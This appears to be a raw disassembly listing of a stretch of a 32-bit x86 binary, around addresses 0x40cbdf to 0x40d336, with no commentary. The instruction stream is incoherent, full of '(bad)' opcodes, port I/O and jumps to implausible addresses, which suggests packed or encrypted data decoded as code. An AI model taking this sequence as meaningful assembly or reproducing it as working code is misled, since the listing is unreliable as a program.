  40cbdf:	sbb    esi,DWORD PTR [edx+edi*2]
  40cbe2:	scas   eax,DWORD PTR es:[edi]
  40cbe3:	push   esi
  40cbe4:	xor    dh,dh
  40cbe6:	out    0xb8,al
  40cbe8:	sahf   
  40cbe9:	mov    ?,WORD PTR [eax]
  40cbeb:	mov    esi,edi
  40cbed:	inc    esp
  40cbee:	dec    eax
  40cbef:	mov    ebp,0xd2e1322a
  40cbf4:	or     cl,BYTE PTR [eax+eiz*1+0x34]
  40cbf8:	xor    al,0x4
  40cbfa:	popa   
  40cbfb:	(bad)  
  40cbfc:	adc    bh,BYTE PTR [ebp-0x2f]
  40cbff:	jo     0x40cbe1
  40cc01:	or     al,0x7
  40cc03:	into   
  40cc04:	and    al,0x29
  40cc06:	add    BYTE PTR [esi-0x3db73674],0x46
  40cc0d:	push   ss
  40cc0e:	xlat   BYTE PTR ds:[ebx]
  40cc0f:	add    esp,0x1d019e7c
  40cc15:	inc    ebp
  40cc16:	inc    ebp
  40cc17:	rcr    DWORD PTR [esi+0x1f],1
  40cc1a:	sbb    eax,0xad948241
  40cc1f:	cli    
  40cc20:	into   
  40cc21:	je     0x40cc1d
  40cc23:	je     0x40cc1e
  40cc25:	nop
  40cc26:	mov    ch,0x2b
  40cc28:	inc    eax
  40cc29:	or     al,0xe4
  40cc2b:	ja     0x40cc23
  40cc2d:	cmp    eax,DWORD PTR [edx-0x5b189033]
  40cc33:	in     eax,dx
  40cc34:	fisttp QWORD PTR [ecx]
  40cc36:	xchg   edi,eax
  40cc37:	mov    al,ds:0x7945e22
  40cc3c:	jnp    0x40cc92
  40cc3e:	test   BYTE PTR [ebp+0xd],ah
  40cc41:	addr16 push ecx
  40cc43:	out    0xc2,al
  40cc45:	js     0x40cc2c
  40cc47:	ds jp  0x40ccb3
  40cc4a:	pop    es
  40cc4b:	mov    dl,0x3c
  40cc4d:	cmp    dh,ch
  40cc4f:	adc    ebx,DWORD PTR [ebx+0x14]
  40cc52:	mov    esp,0xb8a60c1
  40cc57:	ss ret 0xa5a3
  40cc5b:	sub    esp,DWORD PTR [ebx+edx*4-0x2]
  40cc5f:	in     eax,dx
  40cc60:	xor    BYTE PTR [edi-0x251b0512],ch
  40cc66:	int    0x14
  40cc68:	sub    DWORD PTR [ebx],ecx
  40cc6a:	(bad)
  40cc6d:	fisub  WORD PTR [ecx-0x489fae41]
  40cc73:	stos   BYTE PTR es:[edi],al
  40cc74:	sub    edx,DWORD PTR [esi]
  40cc76:	sbb    dh,BYTE PTR [ebx+0x5c]
  40cc79:	push   ebp
  40cc7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc7b:	sub    ebx,0x169d14c0
  40cc81:	xlat   BYTE PTR ds:[ebx]
  40cc82:	les    ecx,FWORD PTR [edx+0x59636d5e]
  40cc88:	popf   
  40cc89:	push   edi
  40cc8a:	sar    BYTE PTR [ecx-0x19],1
  40cc8d:	int3   
  40cc8e:	repz sbb BYTE PTR [eax],dl
  40cc91:	dec    ebx
  40cc92:	and    al,0x82
  40cc94:	(bad)  
  40cc95:	mov    eax,esi
  40cc97:	add    DWORD PTR [eax-0x6b0c73d0],eax
  40cc9d:	rcr    BYTE PTR [ebx+ebx*1-0x402b9025],0xa7
  40cca5:	xchg   esp,eax
  40cca6:	jl     0x40cc9d
  40cca8:	sbb    edi,ecx
  40ccaa:	push   esi
  40ccab:	cmp    eax,0xf101d421
  40ccb0:	adc    al,0xb6
  40ccb2:	adc    bh,BYTE PTR [esi-0x6b]
  40ccb5:	sbb    BYTE PTR [ebp-0x68],dl
  40ccb8:	pop    ss
  40ccb9:	xlat   BYTE PTR ds:[ebx]
  40ccbb:	jecxz  0x40cd1e
  40ccbd:	sub    eax,0xe59c6e2b
  40ccc2:	stc    
  40ccc3:	sbb    ecx,DWORD PTR [ebx+0x6c0dc1aa]
  40ccc9:	push   ebp
  40ccca:	jne    0x40cced
  40cccc:	push   edi
  40cccd:	jnp    0x40ccb9
  40cccf:	jl     0x40cc6a
  40ccd1:	add    al,al
  40ccd3:	mov    dl,BYTE PTR [ecx-0x272eb577]
  40ccd9:	xchg   DWORD PTR [edi-0x5fcbb110],ebx
  40ccdf:	ins    DWORD PTR es:[edi],dx
  40cce0:	enter  0x335e,0xeb
  40cce4:	in     al,0x10
  40cce6:	outs   dx,DWORD PTR ds:[esi]
  40cce7:	fwait
  40cce8:	js     0x40ccb5
  40ccea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cceb:	(bad)  
  40ccec:	lods   eax,DWORD PTR ds:[esi]
  40cced:	rol    DWORD PTR [ebp-0x71],cl
  40ccf0:	and    ah,dh
  40ccf2:	sbb    dl,BYTE PTR [eax-0xe063ac9]
  40ccf8:	and    BYTE PTR [ebp+0x5f58020c],ah
  40ccfe:	cmp    al,0x52
  40cd00:	and    cl,bl
  40cd02:	rcl    DWORD PTR [edi],1
  40cd04:	or     al,0xf3
  40cd06:	xor    BYTE PTR [edi+0x68],0x7d
  40cd0a:	inc    esp
  40cd0b:	loopne 0x40cd24
  40cd0d:	pushf  
  40cd0e:	out    0x83,eax
  40cd10:	loop   0x40cd22
  40cd12:	pop    eax
  40cd13:	popa   
  40cd14:	pop    esi
  40cd15:	into   
  40cd16:	pop    edx
  40cd17:	jae    0x40ccfa
  40cd19:	xor    eax,0x746164e5
  40cd1e:	xor    al,0x61
  40cd20:	(bad)
  40cd23:	aad    0xff
  40cd25:	jg     0x40cd8a
  40cd27:	jle    0x40cd97
  40cd29:	(bad)  
  40cd2a:	popf   
  40cd2b:	pop    ebp
  40cd2c:	adc    bh,ah
  40cd2e:	loop   0x40ccce
  40cd30:	arpl   WORD PTR [esi-0x4d],di
  40cd33:	sbb    BYTE PTR [edi],bl
  40cd35:	dec    esp
  40cd36:	xchg   edx,eax
  40cd37:	xor    BYTE PTR [edx+ebp*1+0x29],dl
  40cd3b:	push   esi
  40cd3c:	scas   al,BYTE PTR es:[edi]
  40cd3d:	sub    BYTE PTR [esi-0x2a],dl
  40cd40:	aas    
  40cd41:	stc    
  40cd42:	or     eax,0x66e90f60
  40cd47:	repnz sbb eax,0x1d47d4e7
  40cd4d:	sbb    eax,0xe699b4ea
  40cd52:	mov    esp,0x3a470332
  40cd57:	push   ds
  40cd58:	popa   
  40cd59:	popa   
  40cd5a:	mov    gs,WORD PTR [eax-0x37]
  40cd5d:	into   
  40cd5e:	xor    ecx,DWORD PTR [esi-0x5f]
  40cd61:	jns    0x40cd97
  40cd63:	cmp    BYTE PTR [eax-0x44],ch
  40cd66:	ss out dx,al
  40cd68:	jbe    0x40cd7b
  40cd6a:	out    0xf2,eax
  40cd6c:	pop    edx
  40cd6d:	leave  
  40cd6e:	lods   al,BYTE PTR ds:[esi]
  40cd6f:	ins    BYTE PTR es:[edi],dx
  40cd70:	jns    0x40cd7a
  40cd72:	xor    ah,cl
  40cd74:	leave  
  40cd75:	loop   0x40cd73
  40cd77:	push   edx
  40cd78:	call   0x45aaf10b
  40cd7d:	mov    DWORD PTR [edx+esi*2-0x39e68c08],ebx
  40cd84:	ret    
  40cd85:	outs   dx,BYTE PTR ds:[esi]
  40cd86:	mov    ch,0x63
  40cd88:	sbb    bl,BYTE PTR [esi+edx*2+0x2ae36d79]
  40cd8f:	(bad)  
  40cd90:	out    dx,eax
  40cd91:	push   esi
  40cd92:	fdiv   QWORD PTR [esi-0xa]
  40cd95:	outs   dx,DWORD PTR ds:[esi]
  40cd96:	sbb    ch,ch
  40cd98:	inc    ebp
  40cd99:	and    BYTE PTR [edi],ah
  40cd9b:	pop    ss
  40cd9c:	popa   
  40cd9d:	sahf   
  40cd9e:	aas    
  40cd9f:	es xchg edi,eax
  40cda1:	xchg   BYTE PTR [edx-0x43],dh
  40cda4:	ret    0xa40
  40cda7:	xchg   ecx,eax
  40cda8:	fst    QWORD PTR [edi-0x3930e713]
  40cdae:	lods   al,BYTE PTR ds:[esi]
  40cdaf:	pop    edx
  40cdb0:	dec    eax
  40cdb1:	outs   dx,DWORD PTR ds:[esi]
  40cdb2:	pop    ebp
  40cdb3:	and    al,BYTE PTR [ecx]
  40cdb5:	clc    
  40cdb6:	dec    ebp
  40cdb7:	in     al,dx
  40cdb8:	push   ss
  40cdb9:	pop    ds
  40cdba:	adc    al,0x9d
  40cdbc:	adc    ch,bh
  40cdbe:	stos   BYTE PTR es:[edi],al
  40cdbf:	jns    0x40cd62
  40cdc1:	fdivr  DWORD PTR [edi-0x3ac21ed7]
  40cdc7:	mov    ds:0xc9a2a49f,al
  40cdcc:	add    BYTE PTR [ebp+0x2727c07e],dl
  40cdd2:	pop    ecx
  40cdd3:	sar    BYTE PTR [edx],0xc8
  40cdd6:	icebp  
  40cdd7:	dec    esi
  40cdd8:	jbe    0x40cd83
  40cdda:	nop
  40cddb:	push   esp
  40cddc:	repz pop edx
  40cdde:	xchg   edx,eax
  40cddf:	imul   ecx,DWORD PTR [esi-0x6f],0x908ba335
  40cde6:	dec    eax
  40cde7:	sub    BYTE PTR [ebx],0x65
  40cdea:	and    ecx,DWORD PTR [ecx+0xeb43f65]
  40cdf0:	shl    esi,0xcf
  40cdf3:	(bad)  
  40cdf4:	lds    esp,FWORD PTR [ecx+0x1df1dfc7]
  40cdfa:	jbe    0x40cdb1
  40cdfc:	inc    ebx
  40cdfd:	dec    edx
  40cdfe:	sbb    eax,0xcc572e18
  40ce03:	(bad)  
  40ce04:	out    dx,eax
  40ce05:	pusha  
  40ce06:	xor    BYTE PTR [ebx+ecx*2],dl
  40ce09:	out    0xd8,al
  40ce0b:	leave  
  40ce0c:	or     eax,0x9dc10432
  40ce11:	test   eax,0xb5bfefbe
  40ce16:	xor    DWORD PTR [eax+0x4],0x660f0c1d
  40ce1d:	sbb    eax,0x76afe9cb
  40ce22:	jne    0x40cdc1
  40ce24:	dec    esi
  40ce25:	push   eax
  40ce26:	or     DWORD PTR [eax],esp
  40ce28:	jbe    0x40ce65
  40ce2a:	mov    dl,0x14
  40ce2c:	icebp  
  40ce2d:	in     eax,0xb6
  40ce2f:	cmc    
  40ce30:	jecxz  0x40ce52
  40ce32:	jp     0x40cdbd
  40ce34:	sbb    esi,ecx
  40ce36:	mov    al,ds:0x37ad564
  40ce3b:	xor    dl,BYTE PTR [eax]
  40ce3d:	push   ss
  40ce3e:	into   
  40ce3f:	int3   
  40ce40:	retf   0x4c22
  40ce43:	in     eax,0xf1
  40ce45:	outs   dx,DWORD PTR ds:[esi]
  40ce46:	call   0xb1ba8362
  40ce4b:	stos   BYTE PTR es:[edi],al
  40ce4c:	mov    bh,BYTE PTR [ecx-0x42]
  40ce4f:	and    ebx,DWORD PTR [edi+edx*2]
  40ce52:	and    al,0xa9
  40ce54:	pop    ds
  40ce55:	aam    0xcf
  40ce57:	sub    DWORD PTR [ecx],0x4f8976ba
  40ce5d:	fdiv   QWORD PTR [ebx-0x48bef917]
  40ce63:	push   eax
  40ce64:	into   
  40ce65:	js     0x40ce43
  40ce67:	xchg   esp,eax
  40ce68:	cdq    
  40ce69:	mov    ebp,ebp
  40ce6b:	pop    ebx
  40ce6c:	jns    0x40ce38
  40ce6e:	rol    BYTE PTR [ebx+0x78],cl
  40ce71:	or     edi,edx
  40ce73:	mov    cs,eax
  40ce75:	ret    
  40ce76:	xchg   DWORD PTR [ecx+eiz*4-0x1422df44],ebp
  40ce7d:	fild   DWORD PTR [edi]
  40ce7f:	pop    ecx
  40ce80:	enter  0x5259,0xd
  40ce84:	in     eax,0xfa
  40ce86:	mov    al,0x1b
  40ce88:	mov    ecx,0x520a0f71
  40ce8d:	test   DWORD PTR [esi-0x21],0x961585d
  40ce94:	data16 stos BYTE PTR es:[edi],al
  40ce96:	test   eax,0x60b353f3
  40ce9b:	sbb    ebp,DWORD PTR ds:0x4a0dde0f
  40cea1:	mov    edx,0x9da78a07
  40cea6:	add    al,0x5d
  40cea8:	add    eax,0x869daac4
  40cead:	(bad)  
  40ceae:	mov    ebp,DWORD PTR [ebx+0xd]
  40ceb1:	mov    ebp,0x367877fe
  40ceb6:	in     eax,0xed
  40ceb8:	push   esi
  40ceb9:	xchg   edi,eax
  40ceba:	dec    esp
  40cebb:	stc    
  40cebc:	in     al,0xd
  40cebe:	pop    eax
  40cebf:	pop    ecx
  40cec0:	pop    ebp
  40cec1:	shr    BYTE PTR [esi],cl
  40cec3:	dec    edi
  40cec4:	mov    ds:0x30b38dce,al
  40cec9:	xchg   BYTE PTR [eax+edi*4+0x607ca916],cl
  40ced0:	lods   eax,DWORD PTR ds:[esi]
  40ced1:	sub    al,al
  40ced3:	sahf   
  40ced4:	fs ins DWORD PTR es:[edi],dx
  40ced6:	add    BYTE PTR [ebp-0xe],0x53
  40ceda:	jecxz  0x40cf57
  40cedc:	call   0x9545:0xc31c69e6
  40cee3:	fwait
  40cee4:	add    DWORD PTR [ecx+eiz*1],eax
  40cee7:	jl     0x40cf0d
  40cee9:	scas   al,BYTE PTR es:[edi]
  40ceea:	dec    ebx
  40ceeb:	xor    ebx,DWORD PTR [ecx+0x3f51a4d9]
  40cef1:	popa   
  40cef2:	jmp    0x40cf32
  40cef4:	adc    ebp,DWORD PTR [edx+0x26]
  40cef7:	add    ah,ch
  40cef9:	jae    0x40cf21
  40cefb:	test   eax,0xc5cbb631
  40cf00:	sahf   
  40cf01:	add    dh,BYTE PTR [eax]
  40cf03:	and    eax,0xf770f63b
  40cf08:	repnz rcr DWORD PTR [eax-0x1c],cl
  40cf0c:	call   0x7309:0xbc89befa
  40cf13:	leave  
  40cf14:	xchg   ebx,eax
  40cf15:	inc    esi
  40cf16:	bound  esp,QWORD PTR [edx+0x78ce2eb1]
  40cf1c:	stos   DWORD PTR es:[edi],eax
  40cf1d:	enter  0x9977,0x70
  40cf21:	mov    al,ds:0xc233dd3
  40cf26:	repnz iret 
  40cf28:	fnstenv [edi-0xc]
  40cf2b:	aad    0x20
  40cf2d:	addr16 adc dl,ch
  40cf30:	jge    0x40cf28
  40cf32:	imul   ecx,DWORD PTR [edi],0xc4b33d17
  40cf38:	and    ch,BYTE PTR [si-0x5a]
  40cf3c:	stc    
  40cf3d:	(bad)  
  40cf3e:	out    0x7e,eax
  40cf40:	pop    esi
  40cf41:	popa   
  40cf42:	sub    ecx,DWORD PTR [edi+edx*4-0x70069db9]
  40cf49:	pusha  
  40cf4a:	jno    0x40cf5e
  40cf4c:	adc    al,0x54
  40cf4e:	rol    DWORD PTR [eax-0x2f082d32],cl
  40cf54:	in     al,0x1e
  40cf56:	jmp    0x40ceef
  40cf58:	or     al,BYTE PTR [edi]
  40cf5a:	inc    edx
  40cf5b:	in     al,0x52
  40cf5d:	or     BYTE PTR [esi+0x9636c95],bl
  40cf63:	xchg   ebp,eax
  40cf64:	les    ecx,FWORD PTR [edi]
  40cf66:	icebp  
  40cf67:	or     ch,al
  40cf69:	and    eax,0xf6b14283
  40cf6e:	scas   eax,DWORD PTR es:[edi]
  40cf6f:	js     0x40cfca
  40cf71:	jno    0x40cf62
  40cf73:	mov    edx,0x97115327
  40cf78:	pop    es
  40cf79:	outs   dx,BYTE PTR ds:[esi]
  40cf7a:	sbb    BYTE PTR [bx+di-0x6856],ah
  40cf7f:	retf   
  40cf80:	out    0x6b,eax
  40cf82:	aaa    
  40cf83:	xchg   edi,eax
  40cf84:	ja     0x40cf6e
  40cf86:	dec    ecx
  40cf87:	jmp    0x40cf9d
  40cf89:	(bad)  
  40cf8a:	push   ss
  40cf8b:	and    BYTE PTR [ebx+0x63],dh
  40cf8e:	pop    ebx
  40cf8f:	loop   0x40cf5d
  40cf91:	mov    cl,0xbe
  40cf93:	mov    bl,0x1c
  40cf95:	rol    BYTE PTR [ebp+edx*1+0x3d],cl
  40cf99:	jmp    0xbda5fc8c
  40cf9e:	(bad)
  40cfa2:	in     eax,dx
  40cfa3:	dec    eax
  40cfa4:	shl    eax,0xe0
  40cfa7:	dec    ebp
  40cfa8:	mov    eax,0xfc8a6e21
  40cfad:	adc    eax,0x1199dc1e
  40cfb2:	popf   
  40cfb3:	nop
  40cfb4:	ret    
  40cfb5:	push   ecx
  40cfb6:	fmul   QWORD PTR [eax-0x7ef63c31]
  40cfbc:	test   al,0x9b
  40cfbe:	aas    
  40cfbf:	xchg   esp,eax
  40cfc0:	adc    al,0x4d
  40cfc2:	rol    BYTE PTR [esi],1
  40cfc4:	imul   esi,DWORD PTR [ebx+0x27],0xba63a7e6
  40cfcb:	adc    BYTE PTR [ecx+eiz*2-0xb],ah
  40cfcf:	outs   dx,DWORD PTR ds:[esi]
  40cfd0:	add    eax,0xc62a90b3
  40cfd5:	fild   WORD PTR [eax+ebp*2]
  40cfd8:	shr    dl,0xb1
  40cfdb:	loope  0x40cf82
  40cfdd:	xchg   esi,eax
  40cfde:	and    BYTE PTR [ebx-0xcc9b6dc],ah
  40cfe4:	add    eax,ebp
  40cfe6:	dec    esp
  40cfe7:	loope  0x40d040
  40cfe9:	inc    edi
  40cfea:	xor    eax,esp
  40cfec:	rol    DWORD PTR [esi+0x17],0x70
  40cff0:	out    dx,al
  40cff1:	fs out 0xbf,eax
  40cff4:	nop
  40cff5:	pop    esp
  40cff6:	push   ds
  40cff7:	add    DWORD PTR [eax+0x34],eax
  40cffa:	pushf  
  40cffb:	cmp    al,0x45
  40cffd:	lahf   
  40cffe:	mov    eax,0x74b32592
  40d003:	mov    bl,BYTE PTR [esi]
  40d005:	adc    esi,DWORD PTR [esi+0xc2ab69d]
  40d00b:	sbb    eax,0xb29a962d
  40d010:	(bad)  
  40d012:	xor    dl,BYTE PTR [ebp-0x36]
  40d015:	popa   
  40d016:	test   BYTE PTR [esi],dl
  40d018:	(bad)  [ebx+0x2d]
  40d01b:	clc    
  40d01c:	(bad)  
  40d01d:	xchg   ebx,eax
  40d01e:	pop    edx
  40d01f:	std    
  40d020:	sahf   
  40d021:	ja     0x40cfe4
  40d023:	mov    ah,0x38
  40d025:	rcl    cl,0xe6
  40d028:	or     al,0x97
  40d02a:	xchg   edx,eax
  40d02b:	not    DWORD PTR [ecx+0x44031100]
  40d031:	sub    edx,ebp
  40d033:	pop    edi
  40d034:	(bad)  
  40d035:	fiadd  WORD PTR es:[esi+0x5]
  40d039:	sbb    bh,bl
  40d03b:	inc    edi
  40d03c:	inc    ebx
  40d03d:	sub    cl,bh
  40d03f:	or     al,BYTE PTR [ecx-0x56]
  40d042:	pop    ebp
  40d043:	lahf   
  40d044:	mul    BYTE PTR [edi-0x4]
  40d047:	leave  
  40d048:	xor    ch,BYTE PTR [eax+0x5556ad69]
  40d04e:	aad    0x76
  40d050:	imul   esp,DWORD PTR [eax-0x7d],0x31df737f
  40d057:	in     al,0x19
  40d059:	fisttp WORD PTR [esi-0x5cd165de]
  40d05f:	mov    esi,DWORD PTR [esi+0x67]
  40d062:	jge    0x40d0cd
  40d064:	and    BYTE PTR [ecx+eax*4],bl
  40d067:	(bad)  
  40d069:	or     al,0x2f
  40d06b:	cs ret 0x184f
  40d06f:	adc    eax,0x4da1191a
  40d074:	cdq    
  40d075:	jle    0x40d077
  40d077:	call   0xe956:0x6ec9fe2f
  40d07e:	es inc ebx
  40d080:	sti    
  40d081:	sbb    eax,0xc592eec5
  40d086:	adc    al,0xa5
  40d088:	jae    0x40d0e7
  40d08a:	imul   esi,DWORD PTR [ebp-0x7600facf],0x3607374
  40d094:	mov    al,0x33
  40d096:	inc    esi
  40d097:	lock xor eax,0x3c5f4243
  40d09d:	stos   BYTE PTR es:[edi],al
  40d09e:	add    ebx,DWORD PTR [ebx]
  40d0a0:	sub    ah,al
  40d0a2:	mov    ds:0x304da234,al
  40d0a7:	pusha  
  40d0a8:	mov    BYTE PTR [eax-0x5c],ah
  40d0ab:	or     esp,DWORD PTR [edx]
  40d0ad:	lahf   
  40d0ae:	(bad)  
  40d0af:	pusha  
  40d0b0:	sbb    DWORD PTR [esi+0x6b],esp
  40d0b3:	add    eax,0x19541ff1
  40d0b8:	(bad)  
  40d0b9:	in     eax,0xa3
  40d0bb:	mov    esi,0x26ad144c
  40d0c0:	dec    esi
  40d0c1:	dec    esi
  40d0c2:	xor    eax,0x8f142274
  40d0c7:	cwde   
  40d0c8:	aam    0x4f
  40d0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0cb:	paddsb mm1,mm1
  40d0ce:	pop    edi
  40d0cf:	aaa    
  40d0d0:	cli    
  40d0d1:	xor    eax,0x392c796
  40d0d6:	mov    bl,0x67
  40d0d8:	inc    ebx
  40d0d9:	mov    fs,edx
  40d0db:	xor    DWORD PTR [edx+0x28fe0eee],ebp
  40d0e1:	pop    ds
  40d0e2:	push   edx
  40d0e3:	test   BYTE PTR [edi-0x21],0xe0
  40d0e7:	cdq    
  40d0e8:	and    bl,bh
  40d0ea:	xor    esp,DWORD PTR [ecx+0x16a34f5a]
  40d0f0:	adc    ecx,ebx
  40d0f2:	rcr    eax,0x6c
  40d0f5:	xor    al,0xa2
  40d0f7:	add    BYTE PTR [edx],0x30
  40d0fa:	pop    eax
  40d0fb:	pop    eax
  40d0fc:	fucom  st(1)
  40d0fe:	push   0xffffff99
  40d100:	and    eax,0x94a9066c
  40d105:	shrd   DWORD PTR [ebx+0x17058dd],ecx,cl
  40d10c:	xor    al,0xa5
  40d10e:	jle    0x40d0a4
  40d110:	adc    al,BYTE PTR [ebx+ecx*1]
  40d113:	(bad)
  40d117:	cmp    ebx,DWORD PTR [ebp-0x4cbb7f56]
  40d11d:	sbb    DWORD PTR [esp+eax*2],eax
  40d120:	js     0x40d0e5
  40d122:	out    0x40,eax
  40d124:	jbe    0x40d0fd
  40d126:	pop    ebp
  40d127:	adc    BYTE PTR [edi+0x6f],ch
  40d12a:	push   ebx
  40d12b:	cmp    BYTE PTR [eax-0x76],dh
  40d12e:	jnp    0x40d15d
  40d130:	mov    ebp,0x90f8d44a
  40d135:	inc    eax
  40d136:	cmp    edx,esi
  40d138:	dec    edx
  40d139:	and    DWORD PTR [esi],edx
  40d13b:	jbe    0x40d10d
  40d13d:	sub    ecx,DWORD PTR [ecx+ebx*2+0x39b39773]
  40d144:	fnstsw WORD PTR [ebp-0x5]
  40d147:	inc    ebp
  40d148:	mov    al,ds:0x379bb487
  40d14d:	sbb    ebx,edx
  40d14f:	rol    al,0xb1
  40d152:	in     eax,dx
  40d153:	mov    bh,0x54
  40d155:	jl     0x40d113
  40d157:	or     al,0x39
  40d159:	mov    cl,0xf1
  40d15b:	fcomp  QWORD PTR [ebx-0x1d5603d2]
  40d161:	not    BYTE PTR [ebx-0x6]
  40d164:	dec    esi
  40d165:	sti    
  40d166:	retf   0xceda
  40d169:	or     BYTE PTR [ecx],0x38
  40d16c:	out    0xf1,eax
  40d16e:	shl    BYTE PTR [esp+eiz*8],0xfc
  40d172:	popa   
  40d173:	add    al,0x29
  40d175:	sbb    al,0xf0
  40d177:	jnp    0x40d1a2
  40d179:	rcl    bl,1
  40d17b:	adc    BYTE PTR [edi+0x5e468535],dh
  40d181:	pop    ecx
  40d182:	dec    eax
  40d183:	in     al,0xae
  40d185:	pop    edx
  40d186:	mov    ebx,0x83f86fa6
  40d18b:	xchg   edx,eax
  40d18c:	cmp    al,0x73
  40d18e:	mov    esp,0xc7e2f0d5
  40d193:	add    DWORD PTR [edx-0x43],ebx
  40d196:	repnz push esp
  40d198:	jno    0x40d13c
  40d19a:	xor    DWORD PTR [edx+0x662f47a4],esi
  40d1a0:	stos   BYTE PTR es:[edi],al
  40d1a1:	stos   BYTE PTR es:[edi],al
  40d1a2:	or     BYTE PTR [esi-0x2e776b7b],dl
  40d1a8:	xchg   DWORD PTR [ecx+0xa5ac47a],edx
  40d1ae:	dec    edi
  40d1af:	jmp    0x8c2ee268
  40d1b4:	pop    eax
  40d1b5:	and    al,0x26
  40d1b7:	test   eax,0x92d39fb6
  40d1bc:	pop    ebx
  40d1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1be:	pop    esp
  40d1bf:	or     esi,esi
  40d1c1:	repnz int3 
  40d1c3:	jge    0x40d1ae
  40d1c5:	inc    ecx
  40d1c6:	cdq    
  40d1c7:	cmp    DWORD PTR [ecx+0x30],eax
  40d1ca:	dec    esp
  40d1cb:	sub    BYTE PTR [edx+eax*4-0x10],bl
  40d1cf:	pop    ss
  40d1d0:	ret    0x48bb
  40d1d3:	or     eax,0x4fa1c71c
  40d1d8:	jge    0x40d22d
  40d1da:	mov    eax,ds:0xdb6d066b
  40d1df:	je     0x40d1cd
  40d1e1:	pop    ss
  40d1e2:	add    ebx,esi
  40d1e4:	leave  
  40d1e5:	dec    ecx
  40d1e6:	les    esp,FWORD PTR ds:0x2bc6f81e
  40d1ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ed:	xor    al,ah
  40d1ef:	aam    0xc1
  40d1f1:	in     al,dx
  40d1f2:	cld    
  40d1f3:	int    0xc7
  40d1f5:	inc    edi
  40d1f6:	xor    BYTE PTR [edi],0x60
  40d1f9:	sbb    eax,0x61b7d92f
  40d1fe:	leave  
  40d1ff:	cmp    DWORD PTR [eax+ebx*8],0x31c2ae1
  40d206:	mov    bl,0xdd
  40d208:	into   
  40d209:	in     eax,0xb8
  40d20b:	popf   
  40d20c:	popf   
  40d20d:	daa    
  40d20e:	xchg   esp,eax
  40d20f:	cmp    al,0xee
  40d211:	jbe    0x40d259
  40d213:	adc    al,0x3b
  40d215:	(bad)  
  40d217:	pop    ss
  40d218:	and    BYTE PTR [eiz*8-0x724dae2a],ah
  40d21f:	pop    edi
  40d220:	in     al,dx
  40d221:	sbb    al,0x6b
  40d223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d224:	or     dl,dh
  40d226:	mov    edx,DWORD PTR [ecx-0x4833edab]
  40d22c:	pusha  
  40d22d:	pop    edi
  40d22e:	mov    ch,0xf2
  40d230:	loop   0x40d29b
  40d232:	add    BYTE PTR ds:0x338a7038,dh
  40d238:	lock jecxz 0x40d26c
  40d23b:	mov    ds:0x34ad05ca,eax
  40d240:	push   0x608df973
  40d245:	out    dx,al
  40d246:	inc    eax
  40d247:	sub    BYTE PTR [ebp-0x3],0x70
  40d24b:	jbe    0x40d29a
  40d24d:	adc    DWORD PTR [esi],0xb4626701
  40d253:	and    ax,di
  40d256:	cwde   
  40d257:	pop    ebp
  40d258:	add    ch,cl
  40d25a:	test   DWORD PTR [edi-0x5b],edx
  40d25d:	jb     0x40d1e8
  40d25f:	ret    
  40d260:	in     al,dx
  40d261:	adc    eax,0xdb0e7edb
  40d266:	aas    
  40d267:	mov    cl,0x24
  40d269:	call   0xce56:0x9a68a76c
  40d270:	inc    esp
  40d271:	mov    edx,0xb927c8d1
  40d276:	aam    0xf2
  40d278:	add    eax,0x5a67cbb7
  40d27d:	push   0x7daf79a8
  40d282:	push   ebx
  40d283:	cmp    DWORD PTR [ecx-0x633d5f1d],0x157fa667
  40d28d:	aaa    
  40d28e:	or     BYTE PTR [ecx-0x18f5536a],ah
  40d294:	mov    cl,0xf1
  40d296:	(bad)  
  40d297:	sbb    eax,ecx
  40d299:	dec    ebx
  40d29a:	xchg   esi,eax
  40d29b:	mov    eax,DWORD PTR [eax+0x6c]
  40d29e:	or     esi,esi
  40d2a0:	and    BYTE PTR [edi+0x75],ch
  40d2a3:	pop    esi
  40d2a4:	sar    BYTE PTR [ebp+0x30],1
  40d2a7:	test   al,0x57
  40d2a9:	xchg   edx,eax
  40d2aa:	inc    ebp
  40d2ab:	adc    BYTE PTR [ebx+0x794c1131],dh
  40d2b1:	fld    TBYTE PTR [eax-0x5a]
  40d2b4:	test   DWORD PTR [edi+ecx*8+0x8],0x279067a0
  40d2bc:	jmp    0x4c4a421b
  40d2c1:	push   0x69
  40d2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c4:	std    
  40d2c5:	xchg   edi,eax
  40d2c6:	inc    edi
  40d2c7:	mov    edx,0x7603a647
  40d2cc:	pop    ds
  40d2cd:	mov    dh,0xcd
  40d2cf:	in     al,dx
  40d2d0:	sub    BYTE PTR [eax-0x70b17f75],bh
  40d2d6:	xchg   ebx,eax
  40d2d7:	jle    0x40d297
  40d2d9:	cmp    bl,bl
  40d2db:	popf   
  40d2dc:	pop    ss
  40d2dd:	xchg   ecx,eax
  40d2de:	sub    edx,DWORD PTR [ebx]
  40d2e0:	jmp    0x2c8ffb4a
  40d2e5:	(bad)  
  40d2e6:	repz mov fs,WORD PTR [eax]
  40d2e9:	xchg   esi,eax
  40d2ea:	aaa    
  40d2eb:	inc    ebp
  40d2ec:	sbb    esp,esp
  40d2ee:	out    0x43,al
  40d2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f1:	sbb    eax,0x97cccbb
  40d2f6:	loopne 0x40d283
  40d2f8:	add    eax,0x24370d07
  40d2fd:	mov    edx,0xdc679edc
  40d302:	ss push edx
  40d304:	sbb    al,0xef
  40d306:	lahf   
  40d307:	(bad)  
  40d308:	jb     0x40d293
  40d30a:	or     cl,bh
  40d30c:	push   0xb1d78a0c
  40d311:	mov    DWORD PTR [edi],edx
  40d313:	mov    ds:0xa84ee2ce,eax
  40d318:	cmc    
  40d319:	xor    esi,ecx
  40d31b:	xor    edx,DWORD PTR [ebp+0x76]
  40d31e:	js     0x40d377
  40d320:	push   ebx
  40d321:	xchg   ebx,eax
  40d322:	sub    cl,BYTE PTR [ebx+ebp*1]
  40d325:	dec    esi
  40d326:	adc    ah,BYTE PTR [ecx-0x15]
  40d329:	fs pop ds
  40d32b:	jg     0x40d386
  40d32d:	adc    DWORD PTR [esi+edx*4],eax
  40d330:	test   eax,0xb7daee96
  40d335:	inc    edi
  40d336:	in     al,dx
